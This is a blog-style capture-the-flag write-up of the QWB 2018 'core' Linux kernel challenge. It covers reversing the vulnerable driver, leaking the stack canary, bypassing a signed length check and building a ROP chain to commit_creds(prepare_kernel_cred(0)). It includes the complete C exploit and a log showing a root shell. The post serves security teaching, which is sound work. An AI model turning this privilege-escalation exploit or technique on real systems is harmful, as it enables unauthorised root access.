---
layout: post
title: "Kernel ROP - 强网杯2018 - core"
date: 2022-07-07
description: ""
category: 
tags: []
---
* TOC
{:toc}

## Kernel ROP

### Check Materials

[Attachment](https://github.com/hai119/QWB2018---core)

```shell
lzy@lzy-virtual-machine:~$ tar xvf core_give.tar 
give_to_player/
give_to_player/bzImage
give_to_player/core.cpio
give_to_player/start.sh
give_to_player/vmlinux
lzy@lzy-virtual-machine:~$ cd give_to_player/
lzy@lzy-virtual-machine:~/give_to_player$ bat start.sh 
───────┬────────────────────────────────────────────────────────────────────────
       │ File: start.sh
───────┼────────────────────────────────────────────────────────────────────────
   1   │ qemu-system-x86_64 \
   2   │ -m 64M \
   3   │ -kernel ./bzImage \
   4   │ -initrd  ./core.cpio \
   5   │ -append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr"\
   6   │ -s  \
   7   │ -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
   8   │ -nographic  \
───────┴────────────────────────────────────────────────────────────────────────
```

`start.sh` is a qemu script, `core.cpio` is the root file system, `bzImage` is the Linux kernel, `vmlinux` is a statically compiled and uncompressed kernel file. (Ps: If the title does not give `vmlinux`, we could extract it by `extract-vmlinux`.)

In `start.sh` qemu script, `-append` enables kaslr, `-s` means that we can use gdb to debug on port 1234, `-m` allocates 64M for the kernel, we need to change it to 128M to ensure the kernel can boot properly.

`vmlinux` is uncompressed, which means we could find and save some gadgets from `vmlinux` for later.

```shell
lzy@lzy-virtual-machine:~/give_to_player$ ropper --file ./vmlinux --nocolor > gagdet
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
```

`core.cpio` is the root file system provided, and we could decompress and view the file system initialization script.

```shell
lzy@lzy-virtual-machine:~/give_to_player$ file core.cpio 
core.cpio: gzip compressed data, last modified: Fri Mar 23 13:41:13 2018, max compression, from Unix
lzy@lzy-virtual-machine:~/give_to_player$ mkdir core
lzy@lzy-virtual-machine:~/give_to_player$ cd core
lzy@lzy-virtual-machine:~/give_to_player/core$ mv ../core.cpio core.cpio.gz
lzy@lzy-virtual-machine:~/give_to_player/core$ gunzip ./core.cpio.gz 
lzy@lzy-virtual-machine:~/give_to_player/core$ cpio -idm < ./core.cpio 
104379 blocks
# cpio is used to create and decompress archives, and also to perform copy-in and copy-out actions on archives, i.e. to append files to and extract files from archives.
# -i: (--extract) specifies to run in copy-in mode, i.e. extract mode;
# -m: (--preserve-modification-time) retains the original time of the file;
# -d: (--make-directories) automatically create directories when needed;
lzy@lzy-virtual-machine:~/give_to_player/core$ bat init 
───────┬────────────────────────────────────────────────────────────────────────
       │ File: init
───────┼────────────────────────────────────────────────────────────────────────
   1   │ #!/bin/sh
   2   │ mount -t proc proc /proc
   3   │ mount -t sysfs sysfs /sys
   4   │ mount -t devtmpfs none /dev
   5   │ /sbin/mdev -s
   6   │ mkdir -p /dev/pts
   7   │ mount -vt devpts -o gid=4,mode=620 none /dev/pts
   8   │ chmod 666 /dev/ptmx
   9   │ cat /proc/kallsyms > /tmp/kallsyms
  10   │ echo 1 > /proc/sys/kernel/kptr_restrict
  11   │ echo 1 > /proc/sys/kernel/dmesg_restrict
  12   │ ifconfig eth0 up
  13   │ udhcpc -i eth0
  14   │ ifconfig eth0 10.0.2.15 netmask 255.255.255.0
  15   │ route add default gw 10.0.2.2 
  16   │ insmod /core.ko
  17   │ 
  18   │ poweroff -d 120 -f &
  19   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh
  20   │ echo 'sh end!\n'
  21   │ umount /proc
  22   │ umount /sys
  23   │ 
  24   │ poweroff -d 0  -f
```

Analysis of the scripts:

* The `mount` is used to mount.
* Line 9 stores `kallsysm` to `/tmp/kallsyms`, and we could read the function addresses in `/tmp/kallsyms`.
* In the tenth line, we can see that the `kptr_restrict` protection is enabled, which prohibits the user mode from reading the `kallsyms ` symbol table.
* Line 11 sets `dmesg_restrict` to 1, which means non-root users cannot read the content of the `kernel ring buffer`.
* Line 16 loads the kernel driver `core`.
* Line 18 sets a two-minutes timed shutdown. 
* In the nineteenth line, the `setsid` command is used to set the initialization user. We modify the script to be the root user and remove the shutdown command to facilitate debugging. 

Besides, the shell script `gen_cpio.sh` is given to facilitate packaging. After modifying the file `init`, package the file system again and try to start the kernel.

```shell
lzy@lzy-virtual-machine:~/give_to_player/core$ bat gen_cpio.sh 
───────┬────────────────────────────────────────────────────────────────────────
       │ File: gen_cpio.sh
───────┼────────────────────────────────────────────────────────────────────────
   1   │ find . -print0 \
   2   │ | cpio --null -ov --format=newc \
   3   │ | gzip -9 > $1
───────┴────────────────────────────────────────────────────────────────────────
lzy@lzy-virtual-machine:~/give_to_player/core$ gedit init 
lzy@lzy-virtual-machine:~/give_to_player/core$ rm core.cpio 
lzy@lzy-virtual-machine:~/give_to_player/core$ ./gen_cpio.sh  core.cpio
.
./vmlinux
./lib64
./lib64/ld-linux-x86-64.so.2
......
./init
./linuxrc
128827 blocks
lzy@lzy-virtual-machine:~/give_to_player/core$ mv core.cpio ..
lzy@lzy-virtual-machine:~/give_to_player/core$ cd ..
lzy@lzy-virtual-machine:~/give_to_player$ ./start.sh 
qemu-system-x86_64: warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx [bit 5]
[    0.024027] Spectre V2 : Spectre mitigation: LFENCE not serializing, switching to generic retpoline
udhcpc: started, v1.26.2
udhcpc: sending discover
udhcpc: sending select for 10.0.2.15
udhcpc: lease of 10.0.2.15 obtained, lease time 86400
/ $ lsmod
core 16384 0 - Live 0x0000000000000000 (O)
```

### Vulnerability Analysis

Analysis of kernel modules:

As we can see, the kernel loads the kernel driver `core`. Firstly, we check the file information of `core.ko` through `checksec`. We could find that Canary and NX are enabled.

```shell
lzy@lzy-virtual-machine:~/give_to_player$ cp core/core.ko .
lzy@lzy-virtual-machine:~/give_to_player$ checksec ./core.ko
[*] Checking for new versions of pwntools
[*] You have the latest version of Pwntools (4.8.0)
[*] '/home/lzy/give_to_player/core.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```

Then we drag the `core.ko` into IDA Pro. There are several functions, **init_module()**, **core_release()**, **core_read()**, **core_copy_func()**, **exit_core()**, **core_write()** and **core_ioctl()**.

Analysis of **init_module()** and **exit_core()**:

```c
__int64 init_module()
{
  core_proc = proc_create("core", 438LL, 0LL, &core_fops);
  printk(&unk_2DE);
  return 0LL;
}
```

The **init_module()** creates a proc entry `/proc/core` and prints the kernel information. After that, we check `core_fops`(File Operation Pointers). There are only three callbacks so although there are **core_read()** and **core_copy_func()** in the list of functions, these two are internal functions of the driver, which can't be called by the user program.

```assembly
.data:0000000000000420 core_fops       dq offset __this_module ; DATA XREF: init_module↑o
.data:0000000000000438                 dq offset core_write
.data:0000000000000468                 dq offset core_ioctl
.data:0000000000000498                 dq offset core_release
```

The **exit_core()** removes the proc entry `/proc/core`.

```c
__int64 exit_core()
{
  __int64 result; // rax

  if ( core_proc )
    result = remove_proc_entry(byte_2D9);
  return result;
}
```

Analysis of  **core_ioctl()**:

```c
__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
{
  __int64 v3; // rbx
   
  v3 = a3;
  switch ( a2 )
  {
    case 0x6677889B:
      core_read(a3);
      break;
    case 0x6677889C:
      printk(&unk_2CD);
      off = v3;
      break;
    case 0x6677889A:
      printk(&unk_2B3);
      core_copy_func(v3);
      break;
  }
  return 0LL;
}
```

`ioctl` is a system call that is used to communicate with the device.

There are three parameters :

```c
int ioctl(int fd,unsigned long cmd,unsigned long value)
```

There are three relative commands here, **core_read()**, **core_copy_func()** and set the global variable `off`.

When  the equation `a2 == 0x6677889B` holds, we call the function **core_read()**;

When  the equation `a2 == 0x6677889BC` holds, we set the global variable `off`;

When  the equation `a2 == 0x6677889A` holds, we call the function **core_copy_func()**;

Analysis of  **core_read()**:

```c
unsigned __int64 __fastcall core_read(__int64 a1)
{
  __int64 v1; // rbx
  __int64 *v2; // rdi
  signed __int64 i; // rcx
  unsigned __int64 result; // rax
  __int64 v5; // [rsp+0h] [rbp-50h]
  unsigned __int64 v6; // [rsp+40h] [rbp-10h]

  v1 = a1;
  v6 = __readgsqword(0x28u);
  printk(&unk_25B);
  printk(&unk_275);
  v2 = &v5;
  for ( i = 16LL; i; --i )
  {
    *(_DWORD *)v2 = 0;
    v2 = (__int64 *)((char *)v2 + 4);
  }
  strcpy((char *)&v5, "Welcome to the QWB CTF challenge.\n");
  result = copy_to_user(v1, (char *)&v5 + off, 64LL);
  if ( !result )
    return __readgsqword(0x28u) ^ v6;
  __asm { swapgs }
  return result;
}
```

There is a relative function here, **copy_to_user()**. And the variable `v6` is the value of Canary.

The **copy_to_user()** function implements the transfer of kernel space data to user space, which is called  “output”.

**core_read()** will use **copy_to_user()** to copy 64 bytes data from `v5[off]` to user space. In **core_ioctl()**, we can set the global variable `off` to `0x40`. So we could use **core_read()** and **core_ioctl()** to leak Canary.

```text
                        rsp---> +-----------+
                                |    buf    |
                   rsp+0x40---> +-----------+
                                |   Canary  |
                   rsp+0x48---> +-----------+
                                |    RBP    |
                                +-----------+
                                |    RIP    |
                                +-----------+ 
```



Analysis of  **core_write()** and **core_copy_func()**:

```c
signed __int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rbx

  v3 = a3;
  printk(&unk_215);
  if ( v3 <= 0x800 && !copy_from_user(&name, a2, v3) )
    return (unsigned int)v3;
  printk(&unk_230);
  return 0xFFFFFFF2LL;
}
```

There is a relative function here, **copy_from_user()**.

The **copy_from_user()** function implements the transfer of user space data to kernel space, which is called  “write”.

**core_write()** will use **copy_from_user()** to write data to the global variable `name`.

```c
signed __int64 __fastcall core_copy_func(signed __int64 a1)
{
  signed __int64 result; // rax
  __int64 v2; // [rsp+0h] [rbp-50h]
  unsigned __int64 v3; // [rsp+40h] [rbp-10h]

  v3 = __readgsqword(0x28u);
  printk(&unk_215);
  if ( a1 > 63 )
  {
    printk(&unk_2A1);
    result = 0xFFFFFFFFLL;
  }
  else
  {
    result = 0LL;
    qmemcpy(&v2, &name, (unsigned __int16)a1);
  }
  return result;
}
```

**core_copy_func()** copies data from the global variable `name` to local variable `v2`, and we could decide the copy length. 

As we can see, there is a length check `a1 > 63`.`a1` is the copy length whose type is `signed __int64`, a signed long integer given by the user. So we can construct a value like `(0xffffffffffffff0000|0x100)`, which will be considered as a negative number less than 63 in the security check to bypass the length limit.

After that, this value will be considered as type `unsigned __int16` in the **qmemcpy()**. So **qmemcpy()** will intercept its lower 16 bits `0x100` as copy length, thus forming a stack overflow.

Through **core_write()** and **core_copy_func()**, we could control the ROP chain.

#### Summary

1. For Stack Canary, we could use the global variable `off` and **core_read()** to leak Canary.

2. Construct the ROP chain and write to the global variable `name` by **core_write()**.

3. Set the appropriate length such as `(0xffffffffffffff0000|0x100)` to bypass the length check, and then write the ROP chain stored in `name` to the local variable to achieve stack overflow for ROP.

4. Execute `commit_creds(prepare_kernel_cred(0))` by ROP to achieve privilege escalation .

   - **int commit_creds(struct cred \* new)**: this function is used to apply a new cred structure to the process.
   - **struct cred\* prepare_kernel_cred(struct task_struct\* daemon)**: this function copies the cred structure of a process and returns a new cred structure, note that the daemon argument should be a **valid process descriptor address or NULL.**

   So we could execute `commit_creds(prepare_kernel_cred(0))` to get root privileges, 0 means prepare new credentials with process 0 as reference.

5. Return to user mode and get shell via system("/bin/sh").

Why bother returning to Userspace?

- Most useful things we want to do are much easier from userland.
- In KernelSpace, there’s no easy way to:
  - Modify the filesystem
  - Create a new process
  - Create network connections

### Exploit

**1. Save user status**

​	We could return to user mode through `swapgs; iretq`. When using `iretq`, we need to set information such as `cs, rflags`, etc. So we could write a function to save this information.

```c
  18   │ void save_status()
  19   │ {
  20   │     __asm__(
  21   │         "mov user_cs, cs;"
  22   │         "mov user_ss, ss;"
  23   │         "mov user_sp, rsp;"
  24   │         "pushf;"
  25   │         "pop user_rflags"
  26   │     );
  27   │ }
```

**2. Get the kernel base address**

​	The offsets in the `vmlinux` are fixed. So we could get the offsets in `vmlinux`. By using pwntools, we could get the base address `0xffffffff81000000` of the kernel and calculate the offset `0x9c8e0` of the function **commit_creds()**.

```shell
lzy@lzy-virtual-machine:~/give_to_player$ python
Python 2.7.17 (default, Mar 18 2022, 13:21:42) 
[GCC 7.5.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> vmlinux = ELF('./vmlinux')
[*] '/home/lzy/give_to_player/vmlinux'
    Arch:     amd64-64-little
    Version:  4.15.8
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0xffffffff81000000)
    RWX:      Has RWX segments
>>> hex(vmlinux.sym['commit_creds'] - 0xffffffff81000000)
'0x9c8e0'
```

​	As mentioned above, the file `init` sets `/proc/kallsyms` to be inaccessible to non-privileged users, but backs it up to `/tmp/kallsyms`. So we could get the address of the target function in `/tmp/kallsyms`.

```c
  39   │ int find_symbols()
  40   │ {
  41   │     char *ptr;
  42   │     char buf[0x40];
  43   │     FILE* fd = fopen("/tmp/kallsyms","r");
  44   │     if(!fd)
  45   │     {
  46   │         printf("[-] Open /tmp/kallsyms ERROR.\n");
  47   │         return 0;
  48   │     }
  49   │     while(fgets(buf,sizeof(buf),fd))
  50   │     {
  51   │         if(commit_creds_addr && prepare_kernel_cred_addr)
  52   │             return 1;
  53   │         if (strstr(buf, "commit_creds")) 
  54   │         {
  55   │             commit_creds_addr = strtoull(buf, &ptr, 16);
  56   │             printf("[+] Find: commit_creds: 0x%llx\n",commit_creds_addr);
  57   │         }
  58   │         if (strstr(buf, "prepare_kernel_cred")) 
  59   │         {
  60   │             prepare_kernel_cred_addr = strtoull(buf, &ptr, 16);
  61   │             printf("[+] Find: prepare_kernel_cred: 0x%llx\n",prepare_kernel_cred_addr);
  62   │         }
  63   │     }
  64   │     return 0;
  65   │ }
```

​	**fgets()** reads the information of each line in kallsyms, such as `ffffffffa16cc0e0 T commit_creds`, we could observe the function address in the first 16 bytes.

​	**strtoull()** is the C library function **unsigned long long int strtoull(const char *nptr, char \*\*endptr, int base)**; This function will turn the string which is pointed by the argument `nptr` to an unsigned long integer(unsigned long long int). The argument `base` must be between 2 and 36, or a special value of 0. So we could use it to convert a character function address to a hexadecimal unsigned long integer.

​	After that, we get the real address of the function **commit_creds()**. According to the real address of the function and its offset relative to the kernel, we could calculate the real kernel base address. `real kernel base address - raw kernel base address = offset of KASLR`. The `offset` needs to be added for subsequent use of other addresses.

​	Now, with the real kernel base address, we could easily bypass KALSR.

**3. Leak Canary**

​	As mentioned in the analysis, we could set the global variable `off` to `0x40`. According to the stack layout, after the Canary is filled, the first 8 bytes of the array taken is the Canary. After that, we can fill the first 80 bytes of the ROP chain with Canary. 0x40 (size of buf) + 0x8 (size of Canary) + 0x8 (size of old_RBP) = 0x50 = 80 bytes.

```text
                        rsp---> +-----------+
                                |    buf    |
                   rsp+0x40---> +-----------+
                                |   Canary  |
                   rsp+0x48---> +-----------+
                                |    RBP    |
                   rsp+0x50---> +-----------+
                                |    RIP    |
                                +-----------+ 
```

```c
  87   │     int fd = open("/proc/core", O_RDWR);
  88   │     if (!fd) {
  89   │         puts("[-] OPEN /proc/core ERROR.");
  90   │         exit(0);
  91   │     }
  92   │     ioctl(fd, CORE_OFF, 0x40);
  93   │     ioctl(fd, CORE_READ, user_buf);  //leak canary
  94   │     size_t canary = ((size_t *)user_buf)[0];
  95   │     printf("[+] Find canary: 0x%llx\n", canary);
  96   │ 
  97   │     for(i = 0; i < 10; i++)
  98   │     {
  99   │         rop[i] = canary;
 100   │     }
```

**4. Construct the ROP chain**

​	We have saved the gadget in advance. The following gadgets are used in the construction of this ROP chain.

```assembly
0xffffffff81000b2f: pop rdi; ret
0xffffffff810a0f49: pop rdx; ret; 
0xffffffff8106a6d2: mov rdi, rax; jmp rdx;
0xffffffff81a012da: swapgs; popfq; ret;
0xffffffff81050ac2: iretq; ret;
```

​	The constructed ROP chain is as follows.

```c
  76   │     vmlinux_base = commit_creds_addr - 0x9c8e0;
  77   │     size_t offset = vmlinux_base - raw_vmlinux_base;
  78   │     size_t pop_rdi = 0xffffffff81000b2f + offset;   //pop rdi; ret;
  79   │     size_t pop_rdx = 0xffffffff810a0f49 + offset;   //pop rdx; ret;
  80   │     size_t mov_rdi = 0xffffffff8106a6d2 + offset;   //mov rdi, rax; jmp rdx;
  81   │     size_t swapgs = 0xffffffff81a012da + offset;    //swapgs; popfq; ret;
  82   │     size_t iretq = 0xffffffff81050ac2 + offset;     //iretq; ret;
  83   │     size_t rop[0x100];
……
 101   │     rop[i++] = pop_rdi;
 102   │     rop[i++] = 0;
 103   │     rop[i++] = prepare_kernel_cred_addr;
 104   │     rop[i++] = pop_rdx;
 105   │     rop[i++] = commit_creds_addr;
 106   │     rop[i++] = mov_rdi;
 107   │     rop[i++] = swapgs;
 108   │     rop[i++] = 0;
 109   │     rop[i++] = iretq;
 110   │     rop[i++] = (size_t)GetShell;
 111   │     rop[i++] = user_cs;
 112   │     rop[i++] = user_rflags;
 113   │     rop[i++] = user_sp;
 114   │     rop[i++] = user_ss;
```

​	From Line 101 to Line 103, we pass 0 to the rdi register as the argument of **prepare_kernel_cred()**, and its return value will be stored in the rax register. 

​	After that, the address of **commit_creds()** is stored in the rdx register, and then pass the return value of **prepare_kernel_cred()** in the rax register to the rdi register as the argument of **commit_creds()** before jumping to **commit_creds()**.

​	Finally, from Line 107 to Line 114, we return to user mode through `swapgs; iretq`. The information needed for `iretq` has been saved in advance in 1. When we execute `iretq`, the information on the stack should be as follows.

``` text
                                +-----------+
                                |    RIP    |
                                +-----------+
                                |    CS     |
                                +-----------+
                                |   rflags  |
                                +-----------+
                                |    RSP    |
                                +-----------+
                                |    SS     |
                                +-----------+                           
```

**5. Attack**

```shell
lzy@lzy-virtual-machine:~/give_to_player$ gcc myexp.c -static -masm=intel -g -o myexp
lzy@lzy-virtual-machine:~/give_to_player$ mv myexp core/myexp 
lzy@lzy-virtual-machine:~/give_to_player$ cd core/
lzy@lzy-virtual-machine:~/give_to_player/core$ ./gen_cpio.sh core.cpio
.
./vmlinux
./lib64
./lib64/ld-linux-x86-64.so.2
......
......
lzy@lzy-virtual-machine:~/give_to_player/core$ cd ..
lzy@lzy-virtual-machine:~/give_to_player$ mv core/core.cpio .
lzy@lzy-virtual-machine:~/give_to_player$ ./start.sh 
qemu-system-x86_64: warning: TCG doesn't support requested feature: CPUID.01H:ECX.vmx [bit 5]
[    0.025101] Spectre V2 : Spectre mitigation: LFENCE not serializing, switching to generic retpoline
udhcpc: started, v1.26.2
udhcpc: sending discover
udhcpc: sending select for 10.0.2.15
udhcpc: lease of 10.0.2.15 obtained, lease time 86400
/ $ ls
bin          dev          init         linuxrc      root         tmp
core.cpio    etc          lib          myexp        sbin         usr
core.ko      gen_cpio.sh  lib64        proc         sys          vmlinux
/ $ ./myexp 
[+] Find: commit_creds: 0xffffffff8129c8e0
[+] Find: prepare_kernel_cred: 0xffffffff8129cce0
[+] Find canary: 0x1a562b8c7c3dc900
/ # id
uid=0(root) gid=0(root)
/ # whoami
root
/ # cat /root/flag 
test
```

exp:

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define CORE_READ 0x6677889B
#define CORE_OFF 0x6677889C
#define CORE_COPY 0x6677889A

size_t vmlinux_base,commit_creds_addr,prepare_kernel_cred_addr;
size_t user_cs,user_ss,user_sp,user_rflags;
size_t raw_vmlinux_base = 0xffffffff81000000;

void save_status()
{
	__asm__(
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_sp, rsp;"
		"pushf;"
		"pop user_rflags"
	);
}

void GetShell() 
{
    if (!getuid())
    {
        system("/bin/sh");
    }
    else 
    {
        puts("[-] CAN NOT GETSHELL.");
        exit(1);
    }
}

int find_symbols()
{
	char *ptr;
	char buf[0x40];
	FILE* fd = fopen("/tmp/kallsyms","r");
	if(!fd)
	{
		printf("[-] Open /tmp/kallsyms ERROR.\n");
		return 0;
	}
	while(fgets(buf,sizeof(buf),fd))
	{
		if(commit_creds_addr && prepare_kernel_cred_addr)
			return 1;
		if (strstr(buf, "commit_creds")) 
		{
            commit_creds_addr = strtoull(buf, &ptr, 16);
			printf("[+] Find: commit_creds: 0x%llx\n",commit_creds_addr);
        }
        if (strstr(buf, "prepare_kernel_cred")) 
		{
            prepare_kernel_cred_addr = strtoull(buf, &ptr, 16);
			printf("[+] Find: prepare_kernel_cred: 0x%llx\n",prepare_kernel_cred_addr);
        }
	}
	return 0;
}

int main()
{
    save_status();
	int f=find_symbols();
	if(!f)
	{
		printf("[-]Find Symbols ERROR.\n");
		exit(0);
	}
	
	vmlinux_base = commit_creds_addr - 0x9c8e0;
	size_t offset = vmlinux_base - raw_vmlinux_base;
	size_t pop_rdi = 0xffffffff81000b2f + offset;	//pop rdi; ret;
	size_t pop_rdx = 0xffffffff810a0f49 + offset;	//pop rdx; ret;
	size_t mov_rdi = 0xffffffff8106a6d2 + offset;	//mov rdi, rax; jmp rdx;
	size_t swapgs = 0xffffffff81a012da + offset;	//swapgs; popfq; ret;
	size_t iretq = 0xffffffff81050ac2 + offset;     //iretq; ret;
	size_t rop[0x100];
	char user_buf[0x40] = {0};
    int i;

	int fd = open("/proc/core", O_RDWR);
    if (!fd) {
        puts("[-] OPEN /proc/core ERROR.");
        exit(0);
    }
	ioctl(fd, CORE_OFF, 0x40);
    ioctl(fd, CORE_READ, user_buf);  //leak canary
	size_t canary = ((size_t *)user_buf)[0];
    printf("[+] Find canary: 0x%llx\n", canary);

    for(i = 0; i < 10; i++)
    {
        rop[i] = canary;
    }
	rop[i++] = pop_rdi;
	rop[i++] = 0;
	rop[i++] = prepare_kernel_cred_addr;
	rop[i++] = pop_rdx;
	rop[i++] = commit_creds_addr;
	rop[i++] = mov_rdi;
	rop[i++] = swapgs;
	rop[i++] = 0;
	rop[i++] = iretq;
    rop[i++] = (size_t)GetShell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
	
	write(fd, rop, sizeof(rop));
	ioctl(fd, CORE_COPY, 0xffffffffffff0000|0x100);
	return 0;
}
```

## Reference

[1] https://unix.stackexchange.com/questions/5518/what-is-the-difference-between-the-following-kernel-makefile-terms-vmlinux-vml

[2] https://blog.csdn.net/gatieme/article/details/78311841

[3] https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/

[4] https://www.anquanke.com/post/id/258874

[5] https://cplusplus.com/reference/cstdlib/strtoull/

[6] https://zhuanlan.zhihu.com/p/266318493

